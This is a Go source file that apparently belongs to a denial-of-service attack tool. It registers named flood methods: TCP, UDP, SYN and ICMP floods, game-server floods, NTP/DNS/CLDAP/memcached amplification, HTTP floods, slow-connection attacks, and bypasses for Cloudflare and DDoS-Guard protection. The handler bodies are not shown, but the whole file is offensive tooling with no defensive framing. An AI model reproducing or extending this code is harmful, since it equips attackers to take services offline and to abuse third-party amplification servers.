package attack

import "context"

// FloodStrategy is the Strategy interface — every L4/L7 method implements it.
// Adding a new method = registering one function, no switch needed.
type FloodStrategy interface {
	Execute(ctx context.Context)
}

// ---- L4 registry (Strategy + Registry pattern) ----

// l4Registry maps method name → bound method on *Layer4.
// Lookup is O(1); adding a method requires only one line here.
var l4Registry map[string]func(*Layer4)

func init() {
	l4Registry = map[string]func(*Layer4){
		"TCP":         (*Layer4).tcp,
		"UDP":         (*Layer4).udp,
		"SYN":         (*Layer4).syn,
		"ICMP":        (*Layer4).icmp,
		"VSE":         (*Layer4).vse,
		"TS3":         (*Layer4).ts3,
		"MCPE":        (*Layer4).mcpe,
		"FIVEM":       (*Layer4).fivem,
		"FIVEM-TOKEN": (*Layer4).fivemToken,
		"OVH-UDP":     (*Layer4).ovhudp,
		"MINECRAFT":   (*Layer4).minecraft,
		"MCBOT":       (*Layer4).mcbot,
		"CPS":         (*Layer4).cps,
		"CONNECTION":  (*Layer4).connection,
		// AMP methods share one handler; payload resolved inside amp()
		"MEM":   (*Layer4).ampDispatch,
		"NTP":   (*Layer4).ampDispatch,
		"DNS":   (*Layer4).ampDispatch,
		"RDP":   (*Layer4).ampDispatch,
		"CLDAP": (*Layer4).ampDispatch,
		"CHAR":  (*Layer4).ampDispatch,
		"ARD":   (*Layer4).ampDispatch,
	}
}

// l7Registry maps method name → bound method on *HTTPFlood.
var l7Registry map[string]func(*HTTPFlood)

func init() {
	l7Registry = map[string]func(*HTTPFlood){
		"GET":        (*HTTPFlood).get,
		"POST":       (*HTTPFlood).post,
		"HEAD":       (*HTTPFlood).head,
		"OVH":        (*HTTPFlood).ovh,
		"STRESS":     (*HTTPFlood).stress,
		"DYN":        (*HTTPFlood).dyn,
		"SLOW":       (*HTTPFlood).slow,
		"NULL":       (*HTTPFlood).null,
		"COOKIE":     (*HTTPFlood).cookie,
		"PPS":        (*HTTPFlood).pps,
		"EVEN":       (*HTTPFlood).even,
		"GSB":        (*HTTPFlood).gsb,
		"BOT":        (*HTTPFlood).bot,
		"APACHE":     (*HTTPFlood).apache,
		"XMLRPC":     (*HTTPFlood).xmlrpc,
		"CFB":        (*HTTPFlood).bypass,
		"CFBUAM":     (*HTTPFlood).bypass,
		"BYPASS":     (*HTTPFlood).bypass,
		"DGB":        (*HTTPFlood).bypass,
		"AVB":        (*HTTPFlood).bypass,
		"TOR":        (*HTTPFlood).tor,
		"RHEX":       (*HTTPFlood).rhex,
		"STOMP":      (*HTTPFlood).stomp,
		"DOWNLOADER": (*HTTPFlood).downloader,
		"KILLER":     (*HTTPFlood).killer,
		"BOMB":       (*HTTPFlood).bypass,
	}
}
